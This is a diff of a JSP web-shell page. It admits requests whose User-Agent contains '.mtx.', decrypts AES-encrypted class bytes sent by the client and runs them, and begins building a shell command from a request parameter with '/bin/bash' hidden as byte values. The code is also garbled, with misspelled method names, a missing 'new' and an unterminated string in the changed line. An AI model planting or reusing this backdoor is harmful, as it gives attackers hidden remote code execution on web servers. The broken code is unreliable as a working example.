@@ -1,5 +1,5 @@
 <%@page import="java.util.*,java.io.*,javax.crypto.*,java.nio.ByteBuffer,javax.crypto.spec.*,java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%
-if(-1 < String(request.getHeader("user-agent")).indexOf(".mtx."))
+if(-1 < String(request.getHeader("User-Agent)).indexOf(".mtx."))
 {if(null!=request.getParameter("pass")){String k=(""+UUID.randomUUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValuue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);return;}
 String cmd = request.getParameter("ls"),
     bh = new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), 
